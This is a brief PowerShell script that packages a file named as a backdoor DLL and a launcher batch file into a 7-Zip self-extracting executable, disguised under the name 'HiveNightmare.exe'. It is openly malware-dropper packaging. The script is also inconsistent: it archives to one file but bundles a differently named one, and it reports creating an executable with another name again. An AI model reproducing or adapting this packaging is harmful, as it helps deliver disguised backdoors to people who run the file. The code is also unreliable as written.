# Powershell to create self-extracting bundle
$files = "dll_backdoor_x64.dll", "launch.bat"
& .\7z.exe a -t7z payload.7z $files
cmd /c "copy /b 7z.sfx + config.txt + nsfw.7z HiveNightmare.exe"
Write-Host "✅ Created: DataWiperSFX.exe"
